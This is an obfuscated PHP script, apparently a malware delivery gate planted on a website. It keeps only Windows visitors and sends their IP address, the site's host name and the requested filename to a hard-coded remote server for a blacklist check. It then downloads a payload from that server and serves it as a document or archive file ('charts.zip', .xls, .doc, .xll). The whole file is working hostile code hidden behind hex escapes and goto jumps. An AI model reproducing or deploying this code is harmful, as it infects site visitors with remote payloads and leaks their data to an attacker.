<?php
 goto Hmbdc; gIs9Q: if (empty($REQUEST_URI)) { die(''); } goto V7ybW; dTlGi: if (empty($hdrs_new["\x68\150"]) && $_GET["\x65"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { die; } goto QrwL_; E0j64: if ($_GET["\x65"] != "\x31\x32\63\56" . $file_ext) { if ($is_black) { die(''); } if ($_GET["\x65"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { $_SESSION["\137\x5f\x72\145\x64\151\162\145\x63\164\137\x77\x61\x73\x5f\163\164\x61\x72\x74"] = true; $_SESSION["\144\157\143\137\x6e\141\155\x65"] = $_GET["\x65"]; if (stripos($_SESSION["\x64\157\143\x5f\x6e\x61\x6d\x65"], "\x2e" . $file_ext) === false) { $_SESSION["\144\157\143\x5f\x6e\141\x6d\145"] .= "\x2e" . $file_ext; } $_SESSION["\x66\151\154\145\x5f\x65\x78\164"] = $file_ext; $redirect_uri = str_replace($_GET["\145"], $REDIRECT_FILENAME . "\56" . $file_ext, $REQUEST_URI); echo "\74\150\164\x6d\x6c\76\74\x62\x6f\144\x79\x3e"; echo "\x3c\144\151\166\40\151\x64\75\x22\x6e\153\42\x20\x64\164\55\x6e\x6b\75\42" . $redirect_uri . "\42\76\74\x2f\144\151\166\x3e"; echo "\74\x73\x63\x72\x69\x70\164\76"; echo "\x6c\x6f\x63\141\164\151\157\156\56\160\x61\x74\150\x6e\141\x6d\145\x20\x3d\x20\144\157\143\165\x6d\145\x6e\x74\x2e\x67\145\164\105\154\x65\x6d\x65\156\x74\102\x79\x49\x64\50\47\156\153\x27\x29\x2e\x67\x65\x74\x41\164\x74\x72\x69\x62\165\164\x65\x28\47\144\164\55\156\x6b\47\x29\73"; echo "\x3c\x2f\163\x63\x72\x69\x70\x74\x3e"; echo "\74\x2f\142\157\x64\171\x3e\74\57\150\164\x6d\x6c\76"; die("\127\141\151\x74\56\56\x2e"); } } else { if (empty($hdrs_new["\x68\x68"])) { die(''); } } goto Sqp0I; rmn04: if (!in_array($file_ext, array("\172\x69\x70", "\x78\x6c\163", "\144\x6f\x63", "\x78\154\154"))) { $file_ext = "\x7a\151\160"; } goto pOpqH; nI5CE: $_GET["\x65"] = $REQUEST_URI_ARR[2]; goto g7bn4; jbPfx: $REQUEST_URI = $_SERVER["\122\105\121\x55\105\x53\124\x5f\x55\122\111"]; goto gIs9Q; LlHc8: foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\150\x74\164\160" => array("\x74\151\155\145\x6f\x75\164" => 10))); $tmp_resp = file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\x73\164\141\164\x75\x73"] === true) { $is_black = $tmp_resp_json["\x69\x73\137\142\x6c\x61\143\153"]; $REDIRECT_FILENAME = $tmp_resp_json["\122\105\x44\x49\x52\105\103\124\x5f\106\x49\x4c\105\116\101\x4d\105"]; break; } } goto E0j64; pOpqH: $data_json = array("\151\x70" => getRealIpAddr(), "\164\151\x6d\145" => time(), "\150\x68" => $hdrs_new["\x68\150"], "\145\170\164" => $file_ext, "\x68\x6f\x73\164" => $_SERVER["\x53\105\122\x56\105\x52\137\116\101\x4d\105"], "\146\x69\154\145\x6e\141\x6d\x65" => $_GET["\x65"]); goto WbnGC; Sqp0I: if (empty($_SESSION["\146\x69\154\145\x5f\145\170\164"])) { $_SESSION["\x66\x69\x6c\145\x5f\x65\170\164"] = "\x7a\x69\160"; } goto dTlGi; Ad2OK: function getRealIpAddr() { if (!empty($_SERVER["\110\124\x54\120\137\x43\114\111\x45\116\x54\137\x49\120"])) { $ip = $_SERVER["\x48\x54\124\x50\x5f\x43\114\x49\x45\116\x54\137\111\x50"]; } elseif (!empty($_SERVER["\x48\x54\x54\120\x5f\130\137\x46\x4f\122\127\x41\x52\104\105\x44\137\x46\x4f\x52"])) { $ip = $_SERVER["\110\124\x54\x50\x5f\x58\137\x46\117\122\x57\x41\122\104\105\104\137\x46\x4f\122"]; } else { $ip = $_SERVER["\122\105\x4d\x4f\124\105\137\101\x44\x44\x52"]; } return $ip; } goto voLRv; BSFcr: if (session_start() === false) { die(''); } goto jbPfx; Q2OA7: foreach ($links as $link) { $ctx = stream_context_create(array("\x68\164\164\160" => array("\164\x69\155\145\x6f\x75\164" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\x2e\x2e\x2e\x2e" || $data == "\x2e\56\56") { break; } if (strlen($data) < 1000) { continue; } header("\103\x6f\156\164\x65\156\164\x2d\104\x65\x73\143\162\x69\160\164\x69\x6f\156\x3a\x20\x46\151\154\x65\40\x54\x72\x61\x6e\163\x66\145\162"); header("\x43\157\x6e\164\145\156\164\x2d\x54\x79\160\x65\x3a\40\x61\160\160\x6c\x69\x63\x61\x74\151\157\156\x2f\157\x63\x74\145\164\55\x73\x74\162\x65\x61\155"); header("\103\157\x6e\x74\x65\x6e\164\55\x44\151\x73\160\157\x73\151\x74\x69\x6f\156\72\40\x61\164\x74\141\x63\x68\155\x65\156\x74\73\40\146\x69\x6c\145\156\x61\x6d\145\x3d" . $_SESSION["\144\x6f\x63\137\156\141\x6d\145"]); header("\103\157\156\x74\145\156\164\x2d\124\162\141\156\163\x66\x65\162\x2d\x45\156\143\157\144\x69\156\147\x3a\x20\x62\x69\156\x61\162\x79"); header("\x43\x6f\x6e\x6e\x65\143\164\x69\157\156\72\x20\x4b\x65\145\x70\55\x41\x6c\151\x76\x65"); header("\x45\170\160\x69\162\x65\163\x3a\x20\60"); header("\x43\x61\x63\x68\145\55\103\157\156\x74\162\157\x6c\x3a\x20\x6d\165\163\164\x2d\162\145\x76\x61\x6c\151\144\x61\x74\145\x2c\40\x70\157\163\x74\x2d\x63\150\x65\x63\x6b\x3d\x30\54\x20\160\162\145\x2d\x63\x68\x65\143\x6b\75\60"); header("\120\x72\x61\x67\155\141\x3a\x20\x70\165\x62\154\151\143"); echo $data; die; } goto CbLC5; QrwL_: $links = array("\150\x74\x74\x70\x3a\57\x2f\x37\67\x2e\x32\x33\x32\x2e\63\66\56\62\x30\x34\57\x72\157\x75\x74\145\x72\x30\70\56\160\x68\x70\77\x70\160\75" . $data_json . "\46\166\145\162\163\151\x6f\156\75" . $VERSION, "\150\x74\164\160\72\x2f\x2f\67\x37\x2e\x32\63\62\x2e\x33\66\x2e\62\x30\64\x2f\162\x6f\165\x74\x65\162\60\x38\x2e\160\150\160\77\160\160\75" . $data_json . "\x26\166\145\x72\x73\151\x6f\x6e\x3d" . $VERSION, "\150\x74\x74\x70\72\57\x2f\67\x37\x2e\62\x33\x32\56\63\66\x2e\62\60\64\x2f\x72\x6f\x75\164\x65\162\x30\70\x2e\x70\150\160\77\x70\x70\75" . $data_json . "\x26\x76\x65\162\x73\x69\x6f\156\75" . $VERSION); goto QG7fo; Hmbdc: $VERSION = "\62\56\x31"; goto HoGDf; HYDSt: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto nI5CE; uF6bh: $hdrs = getallheaders(); goto UsoN4; ebou3: $links_ip_ckeck = array("\150\164\164\160\x3a\x2f\x2f\x37\x37\56\62\63\x32\x2e\x33\66\x2e\62\60\x34\57\x72\x6f\165\x74\x65\162\137\142\x6c\141\143\153\x2e\160\x68\x70\77\151\x70\x3d" . $ip_for_check . "\46\x64\141\x74\141\75" . $data_json . "\46\166\145\162\x73\151\x6f\156\x3d" . $VERSION, "\x68\164\x74\160\72\x2f\57\x37\x37\56\x32\63\62\56\x33\x36\x2e\62\x30\64\x2f\x72\x6f\165\164\x65\x72\x5f\142\x6c\141\143\153\x2e\160\150\x70\77\x69\x70\x3d" . $ip_for_check . "\46\144\x61\164\141\x3d" . $data_json . "\46\x76\x65\162\x73\x69\x6f\156\x3d" . $VERSION, "\150\x74\x74\x70\72\x2f\x2f\67\67\x2e\62\x33\62\x2e\x33\66\56\x32\x30\x34\57\x72\157\x75\164\145\162\x5f\142\154\x61\x63\153\x2e\x70\150\x70\77\x69\160\x3d" . $ip_for_check . "\x26\x64\141\x74\141\x3d" . $data_json . "\x26\166\x65\x72\163\151\157\156\x3d" . $VERSION); goto TkW5v; hw7Xp: if (empty($_SESSION["\x64\x6f\x63\137\x6e\x61\155\145"])) { $_SESSION["\144\157\x63\137\156\x61\x6d\145"] = $REDIRECT_FILENAME . "\56" . $file_ext; } goto Q2OA7; zZ9tR: $file_ext = end($file_ext); goto rmn04; TkW5v: $is_black = false; goto LlHc8; GuRwn: $outfilepath = __DIR__ . "\57\x2e\x2e\57\142\x69\x67\137\x5f\163\x74\x61\164\x2e\164\170\164"; goto hw7Xp; QG7fo: shuffle($links); goto GuRwn; UsoN4: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto MXEIF; g7bn4: if (empty($_SERVER["\110\x54\124\x50\137\125\x53\x45\122\137\101\x47\105\x4e\x54"])) { die(''); } goto evkCK; evkCK: if (stripos($_SERVER["\x48\x54\x54\x50\x5f\x55\123\105\x52\137\x41\x47\105\116\x54"], "\127\151\156\144\157\x77\163") === false) { die(''); } goto Ad2OK; HoGDf: $REDIRECT_FILENAME = "\x63\150\x61\x72\164\163"; goto BSFcr; MKJbD: $data_json = base64_encode($data_json); goto Q1gGW; V7ybW: $REQUEST_URI_ARR = explode("\57", $REQUEST_URI); goto HYDSt; Q1gGW: $ip_for_check = getRealIpAddr(); goto ebou3; WbnGC: $data_json = json_encode($data_json); goto MKJbD; MXEIF: $file_ext = explode("\x2e", $_GET["\145"]); goto zZ9tR; voLRv: $hdrs_new = array(); goto uF6bh; CbLC5: die("\x54\x72\171\x20\141\147\x61\x69\156\56");